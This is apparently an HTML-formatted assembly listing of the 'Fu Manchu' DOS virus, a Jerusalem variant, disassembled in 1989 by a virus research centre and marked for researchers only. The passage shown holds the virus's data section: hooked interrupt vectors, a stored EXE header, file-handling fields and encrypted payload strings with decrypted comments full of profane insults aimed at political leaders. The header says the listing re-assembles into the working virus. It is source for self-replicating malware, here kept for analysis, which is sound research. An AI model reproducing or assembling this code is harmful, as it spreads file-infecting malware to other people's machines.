<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>FUMANCHU.ASM</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc0">    </span><span class="sc9">page</span><span class="sc0">    </span><span class="sc2">65</span><span class="sc4">,</span><span class="sc2">132</span><span class="sc0">
    </span><span class="sc9">title</span><span class="sc0">   </span><span class="sc5">The</span><span class="sc0"> </span><span class="sc12">'Fu Manchu'</span><span class="sc0"> </span><span class="sc5">Virus</span><span class="sc0">
</span><span class="sc1">; ษออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออป</span><span class="sc0">
</span><span class="sc1">; บ                 British Computer Virus Research Centre                   บ</span><span class="sc0">
</span><span class="sc1">; บ  12 Guildford Street,   Brighton,   East Sussex,   BN1 3LS,   England    บ</span><span class="sc0">
</span><span class="sc1">; บ  Telephone:     Domestic   0273-26105,   International  +44-273-26105    บ</span><span class="sc0">
</span><span class="sc1">; บ                                                                          บ</span><span class="sc0">
</span><span class="sc1">; บ                          The 'Fu Manchu' Virus                           บ</span><span class="sc0">
</span><span class="sc1">; บ                Disassembled by Joe Hirst,    June    1989                บ</span><span class="sc0">
</span><span class="sc1">; บ                                                                          บ</span><span class="sc0">
</span><span class="sc1">; บ                      Copyright (c) Joe Hirst 1989.                       บ</span><span class="sc0">
</span><span class="sc1">; บ                                                                          บ</span><span class="sc0">
</span><span class="sc1">; บ      This listing is only to be made available to virus researchers      บ</span><span class="sc0">
</span><span class="sc1">; บ                or software writers on a need-to-know basis.              บ</span><span class="sc0">
</span><span class="sc1">; ศออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออผ</span><span class="sc0">

    </span><span class="sc1">; The virus occurs attached to the beginning of a COM file, or the end</span><span class="sc0">
    </span><span class="sc1">; of an EXE file.  A COM file also has the six-byte 'marker' attached</span><span class="sc0">
    </span><span class="sc1">; to the end.</span><span class="sc0">

    </span><span class="sc1">; This virus is a variation of the Jerusalem virus</span><span class="sc0">

    </span><span class="sc1">; The disassembly has been tested by re-assembly using MASM 5.0.</span><span class="sc0">

</span><span class="sc5">RAM</span><span class="sc0"> </span><span class="sc9">SEGMENT</span><span class="sc0"> </span><span class="sc9">AT</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

    </span><span class="sc1">; System data</span><span class="sc0">

    </span><span class="sc9">ORG</span><span class="sc0"> </span><span class="sc2">3FCH</span><span class="sc0">
</span><span class="sc5">BW03FC</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">BB03FE</span><span class="sc0">  </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc9">ORG</span><span class="sc0"> </span><span class="sc2">417H</span><span class="sc0">
</span><span class="sc5">BB0417</span><span class="sc0">  </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; Key states</span><span class="sc0">
    </span><span class="sc9">ORG</span><span class="sc0"> </span><span class="sc2">46CH</span><span class="sc0">
</span><span class="sc5">BB046C</span><span class="sc0">  </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; System clock - low byte</span><span class="sc0">

    </span><span class="sc9">ORG</span><span class="sc0"> </span><span class="sc2">2CH</span><span class="sc0">
</span><span class="sc5">ENV_SG</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; Segment address of environment</span><span class="sc0">

</span><span class="sc5">RAM</span><span class="sc0"> </span><span class="sc9">ENDS</span><span class="sc0">

</span><span class="sc5">RAM40</span><span class="sc0">   </span><span class="sc9">SEGMENT</span><span class="sc0"> </span><span class="sc9">at</span><span class="sc0"> </span><span class="sc2">400H</span><span class="sc0">

    </span><span class="sc9">ORG</span><span class="sc0"> </span><span class="sc2">1AH</span><span class="sc0">
</span><span class="sc5">BW041A</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Key token in pointer</span><span class="sc0">
</span><span class="sc5">BW041C</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Key token out pointer</span><span class="sc0">
    </span><span class="sc9">ORG</span><span class="sc0"> </span><span class="sc2">80H</span><span class="sc0">
</span><span class="sc5">BW0480</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Key token buffer start pointer</span><span class="sc0">
</span><span class="sc5">BW0482</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Key token buffer end pointer</span><span class="sc0">

</span><span class="sc5">RAM40</span><span class="sc0">   </span><span class="sc9">ENDS</span><span class="sc0">

</span><span class="sc5">CODE</span><span class="sc0">    </span><span class="sc9">SEGMENT</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PUBLIC</span><span class="sc0"> </span><span class="sc12">'CODE'</span><span class="sc0">
    </span><span class="sc9">ASSUME</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">CODE</span><span class="sc4">,</span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc10">NOTHING</span><span class="sc4">,</span><span class="sc8">ES</span><span class="sc4">:</span><span class="sc5">RAM</span><span class="sc0">

    </span><span class="sc1">; Entry point when attached to a COM file</span><span class="sc0">

</span><span class="sc5">START</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">BP0010</span><span class="sc0">

    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc12">'sAX'</span><span class="sc0">

</span><span class="sc5">VR_SIG</span><span class="sc0">  </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc12">'rEMHOr'</span><span class="sc0">

</span><span class="sc5">VIR_RT</span><span class="sc0">  </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc9">THIS</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0">
</span><span class="sc5">V_RTOF</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">100H</span><span class="sc0">
</span><span class="sc5">V_RTSG</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">323FH</span><span class="sc0">

</span><span class="sc5">INT_08</span><span class="sc0">  </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc9">THIS</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0">
</span><span class="sc5">I08OFF</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0106H</span><span class="sc0">           </span><span class="sc1">; Int 8 offset</span><span class="sc0">
</span><span class="sc5">I08SEG</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0E95H</span><span class="sc0">           </span><span class="sc1">; Int 8 segment</span><span class="sc0">

</span><span class="sc5">INT_09</span><span class="sc0">  </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc9">THIS</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0">
</span><span class="sc5">I09OFF</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">02E9H</span><span class="sc0">           </span><span class="sc1">; Int 9 offset</span><span class="sc0">
</span><span class="sc5">I09SEG</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0DC6H</span><span class="sc0">           </span><span class="sc1">; Int 9 segment</span><span class="sc0">

</span><span class="sc5">INT_16</span><span class="sc0">  </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc9">THIS</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0">
</span><span class="sc5">I16OFF</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">; Int 16H offset</span><span class="sc0">
</span><span class="sc5">I16SEG</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">; Int 16H segment</span><span class="sc0">

</span><span class="sc5">INT_21</span><span class="sc0">  </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc9">THIS</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0">
</span><span class="sc5">I21OFF</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">138DH</span><span class="sc0">           </span><span class="sc1">; Int 21H offset</span><span class="sc0">
</span><span class="sc5">I21SEG</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">029BH</span><span class="sc0">           </span><span class="sc1">; Int 21H segment</span><span class="sc0">

</span><span class="sc5">INT_24</span><span class="sc0">  </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc9">THIS</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0">
</span><span class="sc5">I24OFF</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">04EBH</span><span class="sc0">           </span><span class="sc1">; Int 24H offset</span><span class="sc0">
</span><span class="sc5">I24SEG</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">3228H</span><span class="sc0">           </span><span class="sc1">; Int 24H segment</span><span class="sc0">

</span><span class="sc5">BEGIN</span><span class="sc0">   </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">; Initial value for AX</span><span class="sc0">
</span><span class="sc5">F_SIZE</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">49H</span><span class="sc0">         </span><span class="sc1">; Total file size</span><span class="sc0">
</span><span class="sc5">TCOUNT1</span><span class="sc0"> </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">; Timer count (low)</span><span class="sc0">
</span><span class="sc5">TCOUNT2</span><span class="sc0"> </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">; Timer count (high)</span><span class="sc0">
</span><span class="sc5">ST_ES1</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">3195H</span><span class="sc0">           </span><span class="sc1">; Original ES</span><span class="sc0">
</span><span class="sc5">SET_PA</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">00A2H</span><span class="sc0">

    </span><span class="sc1">; Program parameter block</span><span class="sc0">

</span><span class="sc5">PPB_01</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">; Environment address</span><span class="sc0">
</span><span class="sc5">PPB_02</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0080H</span><span class="sc0">           </span><span class="sc1">; Command line offset</span><span class="sc0">
</span><span class="sc5">PPB_03</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">3195H</span><span class="sc0">           </span><span class="sc1">; Command line segment</span><span class="sc0">
</span><span class="sc5">PPB_04</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">005CH</span><span class="sc0">           </span><span class="sc1">; FCB1 offset</span><span class="sc0">
</span><span class="sc5">PPB_05</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">3195H</span><span class="sc0">           </span><span class="sc1">; FCB1 segment</span><span class="sc0">
</span><span class="sc5">PPB_06</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">006CH</span><span class="sc0">           </span><span class="sc1">; FCB2 offset</span><span class="sc0">
</span><span class="sc5">PPB_07</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">3195H</span><span class="sc0">           </span><span class="sc1">; FCB2 segment</span><span class="sc0">

</span><span class="sc5">PRG_SP</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">; Initial stack pointer store</span><span class="sc0">
</span><span class="sc5">PRG_SS</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">31A5H</span><span class="sc0">           </span><span class="sc1">; Initial stack segment store</span><span class="sc0">
</span><span class="sc5">PROGRM</span><span class="sc0">  </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc9">THIS</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0">
</span><span class="sc5">PRGOFF</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">; Initial code offset store</span><span class="sc0">
</span><span class="sc5">PRGSEG</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">31A5H</span><span class="sc0">           </span><span class="sc1">; Initial code segment store</span><span class="sc0">
</span><span class="sc5">SS_ST1</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">; Store for system area data (1)</span><span class="sc0">
</span><span class="sc5">SS_ST2</span><span class="sc0">  </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">86H</span><span class="sc0">         </span><span class="sc1">; Store for system area data (2)</span><span class="sc0">

    </span><span class="sc1">; .EXE header store</span><span class="sc0">

</span><span class="sc5">EXEHED</span><span class="sc0">  </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">4DH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5AH</span><span class="sc0">        </span><span class="sc1">; 00 .EXE header ident</span><span class="sc0">
</span><span class="sc5">EXHD01</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0070H</span><span class="sc0">           </span><span class="sc1">; 02 Bytes in last page</span><span class="sc0">
</span><span class="sc5">EXHD02</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0006H</span><span class="sc0">           </span><span class="sc1">; 04 Size of file in pages</span><span class="sc0">
</span><span class="sc5">EXHD03</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0000H</span><span class="sc0">           </span><span class="sc1">; 06 Number of relocation entries</span><span class="sc0">
</span><span class="sc5">EXHD04</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0020H</span><span class="sc0">           </span><span class="sc1">; 08 Size of header in paragraphs</span><span class="sc0">
</span><span class="sc5">EXHD05</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0000H</span><span class="sc0">           </span><span class="sc1">; 0A Minimum extra storage required</span><span class="sc0">
</span><span class="sc5">EXHD06</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">          </span><span class="sc1">; 0C Maximum extra storage required</span><span class="sc0">
</span><span class="sc5">EXHD07</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0005H</span><span class="sc0">           </span><span class="sc1">; 0E Initial stack segment</span><span class="sc0">
</span><span class="sc5">EXHD08</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc5">ENDADR</span><span class="sc0">          </span><span class="sc1">; 10 Initial stack pointer</span><span class="sc0">
</span><span class="sc5">EXHD09</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">1988H</span><span class="sc0">           </span><span class="sc1">; 12 Negative checksum</span><span class="sc0">
</span><span class="sc5">EXHD10</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0223H</span><span class="sc0">           </span><span class="sc1">; 14 Initial code offset</span><span class="sc0">
</span><span class="sc5">EXHD11</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0005H</span><span class="sc0">           </span><span class="sc1">; 16 Initial code segment</span><span class="sc0">
    </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">01EH</span><span class="sc0">            </span><span class="sc1">; 18 Relative offset of reloc table</span><span class="sc0">
    </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">; 1A Overlay number</span><span class="sc0">

</span><span class="sc5">SIGBUF</span><span class="sc0">  </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">069H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06FH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06EH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00DH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">024H</span><span class="sc0">
</span><span class="sc5">F_HAND</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">5</span><span class="sc0">           </span><span class="sc1">; File handle</span><span class="sc0">
</span><span class="sc5">F_ATTS</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0020H</span><span class="sc0">           </span><span class="sc1">; File attributes</span><span class="sc0">
</span><span class="sc5">F_DATE</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">1273H</span><span class="sc0">           </span><span class="sc1">; File date</span><span class="sc0">
</span><span class="sc5">F_TIME</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">4972H</span><span class="sc0">           </span><span class="sc1">; File time</span><span class="sc0">
</span><span class="sc5">F_SIZ1</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0250H</span><span class="sc0">           </span><span class="sc1">; Low-order file size</span><span class="sc0">
</span><span class="sc5">F_SIZ2</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">; High-order file size</span><span class="sc0">
</span><span class="sc5">F_PATH</span><span class="sc0">  </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc9">THIS</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0">
</span><span class="sc5">FPTHOF</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">3D5BH</span><span class="sc0">           </span><span class="sc1">; Program pathname offset</span><span class="sc0">
</span><span class="sc5">FPTHSG</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">9B70H</span><span class="sc0">           </span><span class="sc1">; Program pathname segment</span><span class="sc0">
</span><span class="sc5">COM_CM</span><span class="sc0">  </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc12">'COMMAND.COM'</span><span class="sc0">
</span><span class="sc5">EXE_SW</span><span class="sc0">  </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">; EXE switch - 0 = .COM extension</span><span class="sc0">
</span><span class="sc5">MEM_SW</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">1</span><span class="sc0">           </span><span class="sc1">; Memory allocated switch</span><span class="sc0">
</span><span class="sc5">OUT_SW</span><span class="sc0">  </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">; Output in progress switch</span><span class="sc0">
</span><span class="sc5">BYTSEC</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0200H</span><span class="sc0">           </span><span class="sc1">; Bytes per sector</span><span class="sc0">
</span><span class="sc5">PARAGR</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0010H</span><span class="sc0">           </span><span class="sc1">; Size of a paragraph</span><span class="sc0">

        </span><span class="sc1">; The next fields are encrypted, and translate to:</span><span class="sc0">

</span><span class="sc1">;STRNG1 DB  'fu manchu virus 3/10/88 - latest in the new fun line!', 0</span><span class="sc0">
</span><span class="sc1">;STRNG2 DB  'thatcher is a cunt ', 0</span><span class="sc0">
</span><span class="sc1">;STRNG3 DB  'reagan is an arsehole ', 0</span><span class="sc0">
</span><span class="sc1">;STRNG4 DB  'botha is a bastard ', 0</span><span class="sc0">
</span><span class="sc1">;STRNG5 DB  'waldheim is a Nazi ', 0</span><span class="sc0">
</span><span class="sc1">;STRNG6 DB  'fuck', 8, 8, 8, 8, 0</span><span class="sc0">
</span><span class="sc1">;STRNG7 DB  'cunt', 8, 8, 8, 8, 0</span><span class="sc0">
</span><span class="sc1">;STRNG8 DB  'The world will hear from me again!   ', 0</span><span class="sc0">

</span><span class="sc5">STRNG1</span><span class="sc0">  </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0C9H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DAH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">08FH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C2H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0CEH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C1H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0CCH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C7H</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0DAH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">08FH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0D9H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C6H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DDH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DAH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DCH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">08FH</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">09CH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">080H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">09EH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">09FH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">080H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">097H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">097H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">08FH</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">082H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">08FH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C3H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0CEH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DBH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0CAH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DCH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DBH</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">08FH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C6H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C1H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">08FH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DBH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C7H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0CAH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">08FH</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0C1H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0CAH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0D8H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">08FH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C9H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DAH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C1H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">08FH</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0C3H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C6H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C1H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0CAH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">08EH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">STRNG2</span><span class="sc0">  </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0DBH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C7H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0CEH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DBH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0CCH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C7H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0CAH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DDH</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">08FH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C6H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DCH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">08FH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0CEH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">08FH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0CCH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DAH</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0C1H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DBH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">08FH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">STRNG3</span><span class="sc0">  </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0DDH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0CAH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0CEH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C8H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0CEH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C1H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">08FH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C6H</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0DCH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">08FH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0CEH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C1H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">08FH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0CEH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DDH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DCH</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0CAH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C7H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C3H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0CAH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">08FH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">STRNG4</span><span class="sc0">  </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0CDH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DBH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C7H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0CEH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">08FH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C6H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DCH</span><span class="sc0">
